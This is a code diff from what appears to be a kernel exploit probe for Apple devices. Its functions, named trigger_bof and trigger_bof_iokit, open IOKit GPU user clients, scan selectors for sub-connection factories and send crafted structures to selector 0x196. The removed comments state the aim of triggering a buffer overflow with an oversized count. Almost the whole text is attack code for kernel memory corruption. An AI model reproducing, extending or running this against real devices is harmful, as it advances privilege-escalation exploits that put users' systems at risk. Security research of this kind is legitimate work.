@@ -172,7 +172,7 @@ static void trigger_bof(id<MTLDevice> dev) {
             (__unsafe_unretained id<MTLAllocation>*)calloc(NIL_TEST_COUNT, sizeof(id));
         if (nil_arr) {
             for (int i = 0; i < 4 && i < (int)resources.count; i++)
-                nil_arr[i] = (__unsafe_unretained id<MTLAllocation>)resources[i];
+                nil_arr[i] = (id<MTLAllocation>)resources[i];
             /* Test Metal nil handling: count=NIL_TEST_COUNT, only 4 real, rest nil */
             [rset addAllocations:nil_arr count:NIL_TEST_COUNT];
             evf("nil_arr count=%d: Metal handled nil allocations (no crash)", NIL_TEST_COUNT);
@@ -247,11 +247,10 @@ static void trigger_bof_iokit(void) {
     evf("IOKIT PROBE: full scan start");
 
     const char *svc_names[] = {
-        "IOGPU", "AGXAcceleratorG18P", "AGXAccelerator", "AGXG18P",
-        "IOGPUDevice", "IOAccelerator", "AGXSolo", NULL
+        "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", "IOAccelerator", NULL
     };
-    const uint32_t ctypes[] = { 0, 1, 2, 3, 4, 5, 6, 7 };
-    const int N_CTYPES = 8;
+    const uint32_t ctypes[] = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 };
+    const int N_CTYPES = 16;
 
     typedef struct { const char *svc; uint32_t ctype; io_connect_t conn; } CEntry;
     CEntry conns[36];
@@ -312,67 +311,63 @@ static void trigger_bof_iokit(void) {
     }
     evf("SCAN_DONE");
 
-    /* Now try the BOF: for every connection that answered sel 0x196, */
-    /* craft struct with count=4 at offset 0x10 (test) then 0x80000000 */
-    /* Also try CREATE first (0x195) to get a valid set handle */
+    /* Sub-connection spawning from type-2 (IOGPUDeviceUserClient):
+     * ResourceGroup client is spawned by a factory selector on the device client.
+     * Scan type-2 for selectors that return a new mach port (not kIOReturnUnsupported). */
+    for (int ci = 0; ci < nc; ci++) {
+        if (conns[ci].ctype != 2) continue;
+        io_connect_t dev_conn = conns[ci].conn;
+        evf("FACTORY_SCAN %s t=2: looking for resource-group factory selector",
+            conns[ci].svc);
+        /* Scan selectors 0..0xFF for non-Unsupported response = potential factory */
+        for (uint32_t sel = 0; sel < 0x100; sel++) {
+            uint64_t sc_in[4] = {0};
+            uint64_t sc_out[4] = {0};
+            uint32_t sc_cnt = 4;
+            uint8_t st_in[64] = {0};
+            uint8_t st_out[64] = {0};
+            size_t st_sz = sizeof(st_out);
+            kern_return_t kr = IOConnectCallMethod(dev_conn, sel,
+                sc_in, 0, st_in, sizeof(st_in),
+                sc_out, &sc_cnt, st_out, &st_sz);
+            if (kr != 0xe00002c7) {
+                evf("FACTORY_HIT t=2 sel=0x%x kr=0x%x sc_out[0]=0x%llx",
+                    sel, kr, sc_out[0]);
+                /* If out[0] looks like a mach port → sub-connection established */
+                if (kr == 0 && sc_out[0] != 0) {
+                    evf("SUBCONN port=0x%llx trying sel 0x196", sc_out[0]);
+                    /* sc_out[0] may be a connection port — scan it for 0x196 */
+                    io_connect_t sub = (io_connect_t)sc_out[0];
+                    uint8_t add_in[128] = {0};
+                    *(uint32_t*)(add_in + 0x20) = 4;  /* count=4 at offset 0x20 */
+                    uint32_t out_cnt = 4;
+                    size_t out_sz = sizeof(st_out);
+                    kern_return_t kr2 = IOConnectCallMethod(sub, 0x196,
+                        NULL, 0, add_in, sizeof(add_in),
+                        sc_out, &out_cnt, st_out, &out_sz);
+                    evf("SUBCONN_0x196 kr=0x%x", kr2);
+                }
+            }
+        }
+    }
+
+    /* Direct selector 0x196 probe on all open connections */
     for (int ci = 0; ci < nc; ci++) {
         io_connect_t conn = conns[ci].conn;
-        uint64_t sc_in[4]  = {0};
+        uint64_t sc_in[4] = {0};
         uint64_t sc_out[4] = {0};
-        uint32_t sc_cnt    = 4;
+        uint32_t sc_cnt = 4;
+        uint8_t add_in[128] = {0};
+        uint8_t add_out[64] = {0};
+        size_t add_out_sz = sizeof(add_out);
 
-        /* Attempt CREATE (0x195) to get handle */
-        uint8_t  cr_in[64] = {0};
-        uint8_t  cr_out[64] = {0};
-        size_t   cr_out_sz = sizeof(cr_out);
-        sc_cnt = 4;
-        kern_return_t kr_cr = IOConnectCallMethod(conn, 0x195,
-            sc_in, 2, cr_in, sizeof(cr_in),
-            sc_out, &sc_cnt, cr_out, &cr_out_sz);
-        if (kr_cr == 0) {
-            evf("CREATE_OK %s t=%u sc_out[0]=0x%llx sc_out[1]=0x%llx cr_out_sz=%zu",
-                conns[ci].svc, conns[ci].ctype, sc_out[0], sc_out[1], cr_out_sz);
-
-            /* Use handle in ADD (0x196) with small count=4 to check struct format */
-            uint8_t add_in[128] = {0};
-            *(uint64_t*)(add_in + 0x00) = sc_out[0];  /* handle at 0x00 */
-            *(uint32_t*)(add_in + 0x10) = 4;           /* count at 0x10 */
-            uint8_t  add_out[64] = {0};
-            size_t   add_out_sz = sizeof(add_out);
-            sc_cnt = 4;
-            kern_return_t kr_add = IOConnectCallMethod(conn, 0x196,
-                sc_in, 0, add_in, sizeof(add_in),
-                sc_out, &sc_cnt, add_out, &add_out_sz);
-            evf("ADD_0x10 %s t=%u handle=0x%llx kr=0x%x",
-                conns[ci].svc, conns[ci].ctype, sc_out[0], kr_add);
-
-            /* Try count at other offsets */
-            const int offsets[] = {0x00, 0x08, 0x18, 0x20, 0x28};
-            for (int oi = 0; oi < 5; oi++) {
-                memset(add_in, 0, sizeof(add_in));
-                *(uint64_t*)(add_in + 0x00) = sc_out[0];
-                *(uint32_t*)(add_in + offsets[oi]) = 4;
-                sc_cnt = 4; add_out_sz = sizeof(add_out);
-                kr_add = IOConnectCallMethod(conn, 0x196,
-                    sc_in, 0, add_in, sizeof(add_in),
-                    sc_out, &sc_cnt, add_out, &add_out_sz);
-                if (kr_add != 0xe00002c7)
-                    evf("ADD_off=0x%x %s t=%u kr=0x%x",
-                        offsets[oi], conns[ci].svc, conns[ci].ctype, kr_add);
-            }
-
-            /* Also try passing handle as scalar[0] */
-            sc_in[0] = sc_out[0];
-            memset(add_in, 0, sizeof(add_in));
-            *(uint32_t*)(add_in + 0x10) = 4;
-            sc_cnt = 4; add_out_sz = sizeof(add_out);
-            kr_add = IOConnectCallMethod(conn, 0x196,
-                sc_in, 1, add_in, sizeof(add_in),
-                sc_out, &sc_cnt, add_out, &add_out_sz);
-            evf("ADD_scalar_hdl %s t=%u kr=0x%x", conns[ci].svc, conns[ci].ctype, kr_add);
-        } else {
-            evf("CREATE_FAIL %s t=%u kr=0x%x", conns[ci].svc, conns[ci].ctype, kr_cr);
-        }
+        /* count=4 at offset 0x20 (where s_group_add_resources reads it) */
+        *(uint32_t*)(add_in + 0x20) = 4;
+        kern_return_t kr = IOConnectCallMethod(conn, 0x196,
+            sc_in, 0, add_in, sizeof(add_in),
+            sc_out, &sc_cnt, add_out, &add_out_sz);
+        if (kr != 0xe00002c7)
+            evf("DIRECT_0x196 %s t=%u kr=0x%x", conns[ci].svc, conns[ci].ctype, kr);
 
         IOServiceClose(conn);
     }
